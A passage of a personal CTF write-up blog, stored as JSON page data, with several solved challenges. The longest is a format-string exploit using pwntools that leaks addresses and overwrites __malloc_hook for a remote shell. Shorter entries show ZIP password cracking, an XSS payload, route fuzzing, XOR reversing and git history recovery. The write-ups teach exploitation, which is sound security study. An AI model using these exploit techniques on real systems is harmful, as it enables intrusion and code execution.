Notice how %lx is replaced with a hexadecimal value on the server\u0026rsquo;s response. Also, if we send multiple formats, the position read from the stack is incremented, and we find our input string as well (2e786c252e786c25 is %lx.%lx. in hexadecimal, little-endian format), at position 6. We can check that we control the stack from this position:\n$ ./format AAAABBBB.%6$lx AAAABBBB.4242424241414141 %7$lx...AAAABBBB 4242424241414141...AAAABBBB  In the above example we put AAAABBBB (8 bytes) at position 6, so using %6$lx will print that string in hexadecimal format. On the other hand, we used %7$lx... to fill position 6 and then AAAABBBB at position 7, so that %7$lx is replaced by 4242424241414141.\nFormat String vulnerabilities also allow us to write arbitrary data into memory using format %n. This format stores the number of characters printed up to the format into the address referenced by the format. For instance, if we put an address in our first 8 bytes of payload, using %6$n right after will store the value 8 at that address. In order to store arbitrary values, we can make use of %c. For instance, %256c will be replaced by 256 whitespaces.\nFormat String exploitation There are no more functions in the binary and we do not know which version of Glibc it is using. Moreover, PIE and Full RELRO are enabled, so first we must obtain the base address of the actual binary and the base address of Glibc.\nLeaking memory addresses To bypass PIE, we must leak the address of some instruction of the binary, in order to compare it to its offset (obtained with Ghidra, GDB or readelf, for example) and then substract those values.\nJust for testing, I will disable ASLR so that all memory addresses are fix:\n# echo 0 | tee /proc/sys/kernel/randomize_va_space 0  Now, I will use a simple Python script to test the first 50 positions in the stack:\n#!/usr/bin/env python3 frompwnimport* context.binary = elf =ELF('format') defget_process(): iflen(sys.argv) ==1: returnelf.process() host, port=sys.argv[1].split(':') returnremote(host, int(port)) defmain(): context.log_level='CRITICAL' foriinrange(50): p=get_process() p.sendline(f'%{i+1}$lx'.encode()) print(i+1, p.recv().decode().strip()) if__name__=='__main__': main()  $ python3 solve.py [*] './format' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 1 7ffff7fa9a03 2 0 3 7ffff7ecafd2 4 7fffffffe5a0 5 0 6 a786c243625 7 58000000380 8 98000000980 9 98000000980 10 98000000980 11 98000000980 12 98000000980 13 98000000980 14 98000000980 15 98000000980 16 98000000980 17 98000000980 18 98000000980 19 98000000980 20 0 21 7ffff7faa5c0 22 0 23 7ffff7e4f525 24 0 25 7ffff7faa5c0 26 0 27 0 28 7ffff7fa64a0 29 7ffff7e4b53d 30 7ffff7faa5c0 31 7ffff7e41de5 32 5555555552d0 33 7fffffffe6b0 34 5555555550c0 35 7fffffffe7c0 36 0 37 55555555526d 38 7ffff7fae2e8 39 f271cac3db528500 40 7fffffffe6d0 41 5555555552b3 42 7fffffffe7c0 43 5808d96f04513c00 44 0 45 7ffff7de1083 46 7ffff7ffc620 47 7fffffffe7c8 48 100000000 49 555555555284 50 5555555552d0  From experience, I know that addresses that start with 555555555 are addresses within the binary, addresses that start with 7ffff7f come from Glibc, and those that start with 7fffffff are stack addresses.\nLet\u0026rsquo;s use GDB to find what are some addresses for:\n$ gdb -q format Reading symbols from format... (No debugging symbols found in format) gef➤ start [+] Breaking at '0x1284'  gef➤ x 0x7ffff7fa9a03 0x7ffff7fa9a03 \u0026lt;_IO_2_1_stdin_+131\u0026gt;: 0x00000000 gef➤ x 0x7ffff7ecafd2 0x7ffff7ecafd2 \u0026lt;__GI___libc_read+18\u0026gt;: 0xf0003d48 gef➤ x 0x7ffff7e4f525 0x7ffff7e4f525 \u0026lt;_IO_default_setbuf+69\u0026gt;: 0x0ffff883 gef➤ x 0x7ffff7faa5c0 0x7ffff7faa5c0 \u0026lt;_IO_2_1_stderr_\u0026gt;: 0xfbad2086 gef➤ x 0x7ffff7fa64a0 0x7ffff7fa64a0 \u0026lt;_IO_file_jumps\u0026gt;: 0x00000000 gef➤ x 0x7ffff7e4b53d 0x7ffff7e4b53d \u0026lt;_IO_new_file_setbuf+13\u0026gt;: 0x74c08548 gef➤ x 0x7ffff7e41de5 0x7ffff7e41de5 \u0026lt;__GI__IO_setvbuf+261\u0026gt;: 0x48c03145 gef➤ x 0x7ffff7fae2e8 0x7ffff7fae2e8 \u0026lt;__exit_funcs_lock\u0026gt;: 0x00000000 gef➤ x 0x7ffff7de1083 0x7ffff7de1083 \u0026lt;__libc_start_main+243\u0026gt;: 0xb6e8c789 gef➤ x 0x7ffff7ffc620 0x7ffff7ffc620 \u0026lt;_rtld_global_ro\u0026gt;: 0x00000000 gef➤ x 0x5555555552d0 0x5555555552d0 \u0026lt;__libc_csu_init\u0026gt;: 0xfa1e0ff3 gef➤ x 0x5555555550c0 0x5555555550c0 \u0026lt;_start\u0026gt;: 0xfa1e0ff3 gef➤ x 0x55555555526d 0x55555555526d \u0026lt;init+117\u0026gt;: 0x458b4890 gef➤ x 0x5555555552b3 0x5555555552b3 \u0026lt;main+47\u0026gt;: 0x000000b8 gef➤ x 0x555555555284 0x555555555284 \u0026lt;main\u0026gt;: 0xfa1e0ff3  We have plenty of addresses to choose for both Glibc and the binary. For instance, let\u0026rsquo;s use position 21 (_IO_2_1_stderr_) for Glibc and position 49 (main) for the binary. Now, let\u0026rsquo;s find the offsets:\n$ ldd format linux-vdso.so.1 (0x00007ffff7fcd000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7db8000) /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcf000) $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep _IO_2_2_stderr_ 1427: 00000000001ed5c0 224 OBJECT GLOBAL DEFAULT 34 _IO_2_1_stderr_@@GLIBC_2.2.5 $ readelf -s format | grep main$ 67: 0000000000001284 74 FUNC GLOBAL DEFAULT 16 main  At this point, we can compute the base addresses of Glibc and the binary substracting the leaked values and the corresponding offsets:\ndefmain(): p=get_process() p.sendline(b'%21$lx') _IO_2_1_stderr__addr=int(p.recvline().decode(), 16) log.info(f'Leaked _IO_2_1_stderr_ address: {hex(_IO_2_1_stderr__addr)}') p.sendline(b'%49$lx') main_addr=int(p.recvline().decode(), 16) log.info(f'Leaked main() address: {hex(main_addr)}') _IO_2_1_stderr__offset=0x1ed5c0 glibc_address=_IO_2_1_stderr__addr-_IO_2_1_stderr__offset log.info(f'Glibc base address: {hex(glibc_address)}') main_offset=0x1284 elf.address=main_addr-main_offset log.info(f'ELF base address: {hex(elf.address)}') p.interactive()  $ python3 solve.py [*] './format' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process './format': pid 2797003 [*] Leaked _IO_2_1_stderr_ address: 0x7ffff7faa5c0 [*] Leaked main() address: 0x555555555284 [+] Glibc base address: 0x7ffff7dbd000 [+] ELF base address: 0x555555554000 [*] Switching to interactive mode $  Since both base addresses end in 000, we can believe that are correct. So we can enable ASLR again:\n# echo 2 | tee /proc/sys/kernel/randomize_va_space 2  Another way to leak an address within Glibc is to use the Global Offset Table (GOT) as in common Ret2Libc challenges (such as, Here\u0026rsquo;s a LIBC):\np.sendline(b'%7$sAAAA'+p64(elf.got.fgets)) fgets_addr=u64(p.recv().split(b'AAAA')[0].ljust(8, b'\\0')) log.info(f'Leaked fgets() address: {hex(fgets_addr)}')  $ python3 solve.py [*] './format' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process './format': pid 2846855 [*] Leaked _IO_2_1_stderr_ address: 0x7f8238c865c0 [*] Leaked main() address: 0x562da7ed8284 [+] Glibc base address: 0x7f8238a99000 [+] ELF base address: 0x562da7ed7000 [*] Leaked fgets() address: 0x7f8238b1b630 [*] Switching to interactive mode $  Finding remote Glibc version Let\u0026rsquo;s run the exploit in remote as is:\n$ python3 solve.py 167.172.52.59:31445 [*] './format' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 167.172.52.59 on port 31445: Done [*] Leaked _IO_2_1_stderr_ address: 0x7f583e826680 [*] Leaked main() address: 0x559ac055e284 [+] Glibc base address: 0x7f583e6390c0 [+] ELF base address: 0x559ac055d000 [*] Switching to interactive mode $  We see that the base address of Glibc is not correct. We can use the last three hexadecimal digits of _IO_2_1_stderr_ and fgets leaked addresses to find a matching Glibc version in libc.blukat.me (Glibc 2.27):\nNow that we can download the correct Glibc version, we can use pwninit to patch the binary and use the remote Glibc version:\n$ pwninit --libc libc6_2.27-3ubuntu1_amd64.so --bin format --no-template bin: format libc: libc6_2.27-3ubuntu1_amd64.so fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1_amd64.deb unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1_amd64.deb setting ./ld-2.27.soexecutable symlinking libc.so.6-\u0026gt; libc6_2.27-3ubuntu1_amd64.so copying formatto format_patched running patchelf on format_patched  At this point, we can use format_patched in our local environment as well.\nGetting RCE Since the binary is fully protected, the way to obtain a shell will be with the arbitrary write primitive that we can get exploiting the Format String vulnerability.\nA nice value to spawn a shell is a one_gadget shell, which is an address of Glibc that spawns a shell under certain conditions:\n$ one_gadget libc6_2.27-3ubuntu1_amd64.so 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL 0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL  There\u0026rsquo;s a function hook (__malloc_hook) that is called whenever malloc is called. When we want to print so much values using printf, this function will use malloc behind the scenes to allocate memory, so that way we can trigger the one_gadget shell if we modify __malloc_hook to hold that address:\n$ readelf -s libc6_2.27-3ubuntu1_amd64.so | grep __malloc_hook 1132: 00000000003ebc30 8 OBJECT WEAK DEFAULT 34 __malloc_hook@@GLIBC_2.2.5 6652: 00000000003ebc30 8 OBJECT WEAK DEFAULT 34 __malloc_hook  For that, we only need to require a lot of memory, for example using \u0026quot;%100000c\u0026quot;, so that malloc is called.\nIn order to craft the payload, pwntools has a great function called fmtstr_payload. We only need to tell the offset where we control values in the stack (6, we saw it at the beginning), and a mapping that holds the address where we want to write to and the value we want to write. Otherwise, a manual Format String exploitation using %n would have been much more tedious. You can find one example on my write-up for Rope machine, but in x86.\nSo, this is the last payload:\none_gadget_shell_offset=0x4f322 __malloc_hook_offset=0x3ebc30 one_gadget_shell_addr=glibc_address+one_gadget_shell_offset __malloc_hook_addr=glibc_address+__malloc_hook_offset p.sendline(fmtstr_payload(6, {__malloc_hook_addr: one_gadget_shell_addr})) p.recv() p.sendline(b'%10000000c') p.interactive()  We have a shell locally:\n$ python3 solve.py [*] './format_patched' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'.' [+] Starting local process './format_patched': pid 2852164 [*] Leaked _IO_2_1_stderr_ address: 0x7fef51487680 [*] Leaked main() address: 0x55654d899284 [+] Glibc base address: 0x7fef5109b000 [+] ELF base address: 0x55654d898000 [*] Leaked fgets() address: 0x7fef51119b20 [*] Switching to interactive mode $ ls format ld-2.27.so libc.so.6 format_patched libc6_2.27-3ubuntu1_amd64.so solve.py  Flag And also remotely:\n$ python3 solve.py 167.172.52.59:31445 [*] './format_patched' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'.' [+] Opening connection to 167.172.52.59 on port 31445: Done [*] Leaked _IO_2_1_stderr_ address: 0x7f796e4fa680 [*] Leaked main() address: 0x55d17f0be284 [+] Glibc base address: 0x7f796e10e000 [+] ELF base address: 0x55d17f0bd000 [*] Leaked fgets() address: 0x7f796e18cb20 [*] Switching to interactive mode $ ls flag.txt format run_challenge.sh $ cat flag.txt HTB{mall0c_h00k_f0r_th3_w1n!}  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/format/","section":"ctf","summary":"64-bit binary. Format String vulnerability","time":8,"title":"Format"},{"contents":"We are given a ZIP file called fsociety.zip:\n$ unzip -v fsociety.zip Archive: fsociety.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 729 Defl:N 186 75% 08-15-2017 17:44 e126a116 sshcreds_datacenter.txt -------- ------- --- ------- 729 186 75% 1 file  We see that it is password-protected:\n$ unzip fsociety.zip Archive: fsociety.zip [fsociety.zip] sshcreds_datacenter.txt password:  Hence, we can try to perform a brute force attack using rockyou.txt and fcrackzip:\n$ fcrackzip -uDp $WORDLISTS/rockyou.txt fsociety.zip PASSWORD FOUND!!!!: pw == justdoit  And we found the password, let\u0026rsquo;s uncompress the ZIP archive and read sshcreds_datacenter.txt:\n$ unzip fsociety.zip Archive: fsociety.zip [fsociety.zip] sshcreds_datacenter.txt password: inflating: sshcreds_datacenter.txt $ cat sshcreds_datacenter.txt ***************************************************************************************** Encrypted SSH credentials to access Blume ctOS : MDExMDEwMDEgMDExMDAxMTAgMDEwMTExMTEgMDExMTEwMDEgMDAxMTAwMDAgMDExMTAxMDEgMDEwMTExMTEgMDExMDAwMTEgMDEwMDAwMDAgMDExMDExMTAgMDEwMTExMTEgMDAxMDAxMDAgMDExMDExMDEgMDAxMTAwMTEgMDExMDExMDAgMDExMDExMDAgMDEwMTExMTEgMDExMTAxMTEgMDExMDEwMDAgMDEwMDAwMDAgMDExMTAxMDAgMDEwMTExMTEgMDExMTAxMDAgMDExMDEwMDAgMDAxMTAwMTEgMDEwMTExMTEgMDExMTAwMTAgMDAxMTAwMDAgMDExMDAwMTEgMDExMDEwMTEgMDEwMTExMTEgMDExMDEwMDEgMDExMTAwMTEgMDEwMTExMTEgMDExMDAwMTEgMDAxMTAwMDAgMDAxMTAwMDAgMDExMDEwMTEgMDExMDEwMDEgMDExMDExMTAgMDExMDAxMTE= *****************************************************************************************  The large string seems to be encoded in Base64, let\u0026rsquo;s decode it:\n$ echo MDExMDEwMDEgMDExMDAxMTAgMDEwMTExMTEgMDExMTEwMDEgMDAxMTAwMDAgMDExMTAxMDEgMDEwMTExMTEgMDExMDAwMTEgMDEwMDAwMDAgMDExMDExMTAgMDEwMTExMTEgMDAxMDAxMDAgMDExMDExMDEgMDAxMTAwMTEgMDExMDExMDAgMDExMDExMDAgMDEwMTExMTEgMDExMTAxMTEgMDExMDEwMDAgMDEwMDAwMDAgMDExMTAxMDAgMDEwMTExMTEgMDExMTAxMDAgMDExMDEwMDAgMDAxMTAwMTEgMDEwMTExMTEgMDExMTAwMTAgMDAxMTAwMDAgMDExMDAwMTEgMDExMDEwMTEgMDEwMTExMTEgMDExMDEwMDEgMDExMTAwMTEgMDEwMTExMTEgMDExMDAwMTEgMDAxMTAwMDAgMDAxMTAwMDAgMDExMDEwMTEgMDExMDEwMDEgMDExMDExMTAgMDExMDAxMTE= | base64 -d 01101001 01100110 01011111 01111001 00110000 01110101 01011111 01100011 01000000 01101110 01011111 00100100 01101101 00110011 01101100 01101100 01011111 01110111 01101000 01000000 01110100 01011111 01110100 01101000 00110011 01011111 01110010 00110000 01100011 01101011 01011111 01101001 01110011 01011111 01100011 00110000 00110000 01101011 01101001 01101110 01100111  Now we have binary\u0026hellip; Let\u0026rsquo;s join all the terms and transform it into a hexadecimal number using Python:\n$ echo MDExMDEwMDEgMDExMDAxMTAgMDEwMTExMTEgMDExMTEwMDEgMDAxMTAwMDAgMDExMTAxMDEgMDEwMTExMTEgMDExMDAwMTEgMDEwMDAwMDAgMDExMDExMTAgMDEwMTExMTEgMDAxMDAxMDAgMDExMDExMDEgMDAxMTAwMTEgMDExMDExMDAgMDExMDExMDAgMDEwMTExMTEgMDExMTAxMTEgMDExMDEwMDAgMDEwMDAwMDAgMDExMTAxMDAgMDEwMTExMTEgMDExMTAxMDAgMDExMDEwMDAgMDAxMTAwMTEgMDEwMTExMTEgMDExMTAwMTAgMDAxMTAwMDAgMDExMDAwMTEgMDExMDEwMTEgMDEwMTExMTEgMDExMDEwMDEgMDExMTAwMTEgMDEwMTExMTEgMDExMDAwMTEgMDAxMTAwMDAgMDAxMTAwMDAgMDExMDEwMTEgMDExMDEwMDEgMDExMDExMTAgMDExMDAxMTE= | base64 -d | tr -d ' ' 0110100101100110010111110111100100110000011101010101111101100011010000000110111001011111001001000110110100110011011011000110110001011111011101110110100001000000011101000101111101110100011010000011001101011111011100100011000001100011011010110101111101101001011100110101111101100011001100000011000001101011011010010110111001100111 $ python3 -c \"print(hex(0b$(echo MDExMDEwMDEgMDExMDAxMTAgMDEwMTExMTEgMDExMTEwMDEgMDAxMTAwMDAgMDExMTAxMDEgMDEwMTExMTEgMDExMDAwMTEgMDEwMDAwMDAgMDExMDExMTAgMDEwMTExMTEgMDAxMDAxMDAgMDExMDExMDEgMDAxMTAwMTEgMDExMDExMDAgMDExMDExMDAgMDEwMTExMTEgMDExMTAxMTEgMDExMDEwMDAgMDEwMDAwMDAgMDExMTAxMDAgMDEwMTExMTEgMDExMTAxMDAgMDExMDEwMDAgMDAxMTAwMTEgMDEwMTExMTEgMDExMTAwMTAgMDAxMTAwMDAgMDExMDAwMTEgMDExMDEwMTEgMDEwMTExMTEgMDExMDEwMDEgMDExMTAwMTEgMDEwMTExMTEgMDExMDAwMTEgMDAxMTAwMDAgMDAxMTAwMDAgMDExMDEwMTEgMDExMDEwMDEgMDExMDExMTAgMDExMDAxMTE= | base64 -d | tr -d ' ')))\" 0x69665f7930755f63406e5f246d336c6c5f776840745f7468335f7230636b5f69735f6330306b696e67  They look like readable ASCII bytes, so let\u0026rsquo;s transform the hexadecimal number into bytes:\n$ python3 -c \"print(bytes.fromhex(hex(0b$(echo MDExMDEwMDEgMDExMDAxMTAgMDEwMTExMTEgMDExMTEwMDEgMDAxMTAwMDAgMDExMTAxMDEgMDEwMTExMTEgMDExMDAwMTEgMDEwMDAwMDAgMDExMDExMTAgMDEwMTExMTEgMDAxMDAxMDAgMDExMDExMDEgMDAxMTAwMTEgMDExMDExMDAgMDExMDExMDAgMDEwMTExMTEgMDExMTAxMTEgMDExMDEwMDAgMDEwMDAwMDAgMDExMTAxMDAgMDEwMTExMTEgMDExMTAxMDAgMDExMDEwMDAgMDAxMTAwMTEgMDEwMTExMTEgMDExMTAwMTAgMDAxMTAwMDAgMDExMDAwMTEgMDExMDEwMTEgMDEwMTExMTEgMDExMDEwMDEgMDExMTAwMTEgMDEwMTExMTEgMDExMDAwMTEgMDAxMTAwMDAgMDAxMTAwMDAgMDExMDEwMTEgMDExMDEwMDEgMDExMDExMTAgMDExMDAxMTE= | base64 -d | tr -d ' '))[2:]))\" b'if_y0u_c@n_$m3ll_wh@t_th3_r0ck_is_c00king'  And the flag is: HTB{if_y0u_c@n_$m3ll_wh@t_th3_r0ck_is_c00king}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/fs0ciety/","section":"ctf","summary":"ZIP archive password brute force. Base64, binary and hexadecimal encodings","time":2,"title":"fs0ciety"},{"contents":"We are provided with this webpage:\nAt the bottom of the page we have a text input:\nIf we provide some data, we see a message:\nHowever, the website tells us to pop an alert(). This is usually a proof of concept for Cross-Site Scripting (XSS) payloads. One of the simplest payloads for XSS is:\n\u0026lt;imgsrc=xonerror=alert(1)\u0026gt;  If we use it, we will see the flag in the alert (HTB{p0p..p0p..p0p...alert(1337)}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/full-stack-conf/","section":"ctf","summary":"Cross-Site Scripting","time":1,"title":"Full Stack Conf"},{"contents":"We are given a website that shows two background colors:\nThe red button uses a GET request and the blue one uses a POST request. We do not see anything.\nSince the challenge name includes HEAD, let\u0026rsquo;s see if we can perform a HEAD request using curl:\n$ curl -I mercury.picoctf.net:47967 HTTP/1.1 200 OK flag: picoCTF{r3j3ct_th3_du4l1ty_cca66bd3} Content-type: text/html; charset=UTF-8  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/web-exploitation/get-ahead/","section":"ctf","summary":"picoCTF 2021. 20 points. HEAD request method","time":1,"title":"GET aHEAD"},{"contents":"We are given a binary file called ghost:\n$ file ghost ghost: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=810d0f9271ec04d80a2eee6ff2afd9367da3c3dd, for GNU/Linux 3.2.0, not stripped  Reverse engineering If we open the binary in Ghidra, we will see this decompiled main function in C:\nintmain() { undefined8 flag;  flag =get_flag(); printf(\"%s\\r|\\x1b[4m%*.c\\x1b[24m| I\\'ve managed to trap the flag ghost in this box, butit\\'s turn ed invisible!\\nCan you figure out how to reveal them?\\n\", flag, 0x28, 0x5f); return0; }  It calls a function named get_flag and outputs a string containing the flag variable. This is get_flag:\nvoid*get_flag() { void*__s; uinti;  __s =malloc(0x29); memset(__s, 0, 0x29); for(i =0; i \u0026lt;0x28; i =i +1) { *(byte *) ((long) __s +(long) (int) i) =_[(int) i] ^0x13; } return__s; }  XOR cipher If we look closely, it is doing XOR operations using 0x13 as key and a global variable called _ as encrypted data. In Ghidra, we have these bytes assigned to _:\n_ XREF[3]: Entry Point(*), get_flag:0010118f(*), get_flag:00101196(R) 00102020 5b 47 51 undefine 68 7b 27 66 7d 67 00102020 5b undefined15Bh [0] XREF[3]: Entry Point(*), get_flag:0010118f(*), get_flag:00101196(R) 00102021 47 undefined147h [1] 00102022 51 undefined151h [2] 00102023 68 undefined168h [3] 00102024 7b undefined17Bh [4] 00102025 27 undefined127h [5] 00102026 66 undefined166h [6] 00102027 7d undefined17Dh [7] 00102028 67 undefined167h [8] 00102029 20 undefined120h [9] 0010202a 77 undefined177h [10] 0010202b 4c undefined14Ch [11] 0010202c 71 undefined171h [12] 0010202d 6a undefined16Ah [13] 0010202e 4c undefined14Ch [14] 0010202f 67 undefined167h [15] 00102030 7b undefined17Bh [16] 00102031 20 undefined120h [17] 00102032 4c undefined14Ch [18] 00102033 74 undefined174h [19] 00102034 7b undefined17Bh [20] 00102035 23 undefined123h [21] 00102036 60 undefined160h [22] 00102037 67 undefined167h [23] 00102038 26 undefined126h [24] 00102039 4c undefined14Ch [25] 0010203a 23 undefined123h [26] 0010203b 75 undefined175h [27] 0010203c 4c undefined14Ch [28] 0010203d 70 undefined170h [29] 0010203e 67 undefined167h [30] 0010203f 75 undefined175h [31] 00102040 26 undefined126h [32] 00102041 4c undefined14Ch [33] 00102042 63 undefined163h [34] 00102043 27 undefined127h [35] 00102044 26 undefined126h [36] 00102045 67 undefined167h [37] 00102046 32 undefined132h [38] 00102047 6e undefined16Eh [39]  Flag At this point, I took those bytes and performed the same XOR cipher as in get_flag to read the flag:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; data = bytes([ ... 0x5b, ... 0x47, ... 0x51, ... 0x68, ... 0x7b, ... 0x27, ... 0x66, ... 0x7d, ... 0x67, ... 0x20, ... 0x77, ... 0x4c, ... 0x71, ... 0x6a, ... 0x4c, ... 0x67, ... 0x7b, ... 0x20, ... 0x4c, ... 0x74, ... 0x7b, ... 0x23, ... 0x60, ... 0x67, ... 0x26, ... 0x4c, ... 0x23, ... 0x75, ... 0x4c, ... 0x70, ... 0x67, ... 0x75, ... 0x26, ... 0x4c, ... 0x63, ... 0x27, ... 0x26, ... 0x67, ... 0x32, ... 0x6e, ... ]) \u0026gt;\u0026gt;\u0026gt; from pwn import xor \u0026gt;\u0026gt;\u0026gt; xor(data, b'\\x13') b'HTB{h4unt3d_by_th3_gh0st5_0f_ctf5_p45t!}'  Another way of solving it was simply processing the output of the binary with xxd, head or tr:\n$ ./ghost | xxd 00000000: 4854 427b 6834 756e 7433 645f 6279 5f74 HTB{h4unt3d_by_t 00000010: 6833 5f67 6830 7374 355f 3066 5f63 7466 h3_gh0st5_0f_ctf 00000020: 355f 7034 3574 217d 0d7c 1b5b 346d 2020 5_p45t!}.|.[4m 00000030: 2020 2020 2020 2020 2020 2020 2020 2020 00000040: 2020 2020 2020 2020 2020 2020 2020 2020 00000050: 2020 2020 205f 1b5b 3234 6d7c 2049 2776 _.[24m| I'v 00000060: 6520 6d61 6e61 6765 6420 746f 2074 7261 e managed to tra 00000070: 7020 7468 6520 666c 6167 2067 686f 7374 p the flag ghost 00000080: 2069 6e20 7468 6973 2062 6f78 2c20 6275 in this box, bu 00000090: 7420 6974 2773 2074 7572 6e65 6420 696e t it's turned in 000000a0: 7669 7369 626c 6521 0a43 616e 2079 6f75 visible!.Can you 000000b0: 2066 6967 7572 6520 6f75 7420 686f 7720 figure out how 000000c0: 746f 2072 6576 6561 6c20 7468 656d 3f0a to reveal them?. $ ./ghost | head -c 40 HTB{h4unt3d_by_th3_gh0st5_0f_ctf5_p45t!} $ ./ghost | tr -d '\\r' HTB{h4unt3d_by_th3_gh0st5_0f_ctf5_p45t!}|_| I've managed to trap the flag ghost in this box, but it's turned invisible! Can you figure out how to reveal them?  The issue was a carriage return character (\\r, \\x0d), which makes the subsequent characters to overwrite the flag.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/ghost-wrangler/","section":"ctf","summary":"XOR cipher. Carriage return","time":4,"title":"Ghost Wrangler"},{"contents":"We are given a ZIP archive that contains a flag.txt file:\n$ ls flag.txt $ cat flag.txt CTFlearn{REDACTED}  But this is not the flag. Looking deeply in the folder, we find a .git directory, so we are into a Git repository (also, the chalenge name pointed this):\n$ ls -a . .. .git flag.txt  We can use git log to show previous commits (which are like snapshots of the project along time):\n$ git log commit d10f77c4e766705ab36c7f31dc47b0c5056666bb (HEAD -\u0026gt; master) Author: LaScalaLuke \u0026lt;lascala.luke@gmail.com\u0026gt; Date: Sun Oct 30 14:33:18 2016 -0400 Edited files commit 195dd65b9f5130d5f8a435c5995159d4d760741b Author: LaScalaLuke \u0026lt;lascala.luke@gmail.com\u0026gt; Date: Sun Oct 30 14:32:44 2016 -0400 Edited files commit 6e824db5ef3b0fa2eb2350f63a9f0fdd9cc7b0bf Author: LaScalaLuke \u0026lt;lascala.luke@gmail.com\u0026gt; Date: Sun Oct 30 14:32:11 2016 -0400 edited files  Using git diff we are able to show the differences between two commits (we must provide some of the first characters of the commit identifiers). This one is interesting:\n$ git diff 6e824db5 195dd65b diff --git a/flag.txt b/flag.txt index c5250d0..8684e68 100644 --- a/flag.txt +++ b/flag.txt @@ -1 +1 @@ -CTFlearn{REDACTED} +CTFlearn{protect_your_git}  And there is the flag.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/forensics/git-is-good/","section":"ctf","summary":"Git commits","time":1,"title":"Git Is Good"},{"contents":"We are given a JPEG image called garden.jpg:\nThe file is recognized as a proper JPEG image:\n$ file garden.jpg garden.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 2999x2249, components 3  However, if we show printable strings inside the file contents, we capture the flag (we can specify the length of the string to output):\n$ strings -50 garden.jpg Here is a flag \"picoCTF{more_than_m33ts_the_3y3eBdBd2cc}\"  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/forensics/glory-of-the-garden/","section":"ctf","summary":"picoCTF 2019. 50 points. Printable characters in files","time":1,"title":"Glory of the Garden"},{"contents":"We have this website:\nAt the bottom it points the use of gobuster and a dictionary of routes called dirb/common.txt:\nAs the challenge suggests, let\u0026rsquo;s use gobuster with dirb/common.txt:\n$ gobuster dir -u https://gobustme.ctflearn.com -w $WORDLISTS/dirb/common.txt -q -r /call (Status: 200) [Size: 42] /carpet (Status: 200) [Size: 69] /flag (Status: 200) [Size: 15] /hide (Status: 200) [Size: 65] /index.html (Status: 200) [Size: 2712] /sex (Status: 200) [Size: 58] /shadow (Status: 200) [Size: 68] /skin (Status: 200) [Size: 120]  Nice, let\u0026rsquo;s go to /flag and get the flag:\n$ curl https://gobustme.ctflearn.com/flag/ No, too easy :)  Hmmm, then it must be at /hide:\n$ curl https://gobustme.ctflearn.com/hide/ It was well hidden isn't it? CTFlearn{gh0sbu5t3rs_4ever} \u0026amp;#128123  Just for fun, these where the other routes:\n$ curl https://gobustme.ctflearn.com/call/ Who you gonna call? Ghostbusters! \u0026amp;#128123 $ curl https://gobustme.ctflearn.com/carpet/ My sheet is dirty, do you mind if I use your carpet instead? \u0026amp;#128123 $ curl https://gobustme.ctflearn.com/sex/ Sex? I am 900 years old, I am too old for this... \u0026amp;#128123 $ curl https://gobustme.ctflearn.com/shadow/ I am following everywhere you go, I am your shadow... boo! \u0026amp;#128123; $ curl https://gobustme.ctflearn.com/skin/ \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; We are ghosts, do you really think we have skin? \u0026amp;#128123; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/web/gobustme/","section":"ctf","summary":"Fuzzing routes","time":1,"title":"Gobustme 👻"},{"contents":"We got the Python source code used to encrypt the flag:\nfromCrypto.Util.numberimportbytes_to_long, getPrime importrandom FLAG=b'HTB{??????????????????????????????????????????????????????????????????????}' defgen_params(): p=getPrime(1024) g=random.randint(2, p-2) x=random.randint(2, p-2) h=pow(g, x, p) return(p, g, h), x defencrypt(pubkey): p, g, h=pubkey m=bytes_to_long(FLAG) y=random.randint(2, p-2) s=pow(h, y, p) return(g*y%p, m*s%p) defmain(): pubkey, privkey=gen_params() c1, c2=encrypt(pubkey) withopen('data.txt', 'w') asf: f.write(f'p = {pubkey[0]}\\ng = {pubkey[1]}\\nh = {pubkey[2]}\\n(c1, c2) = ({c1}, {c2})\\n') if__name__==\"__main__\": main()  We also have the output of the script:\np = 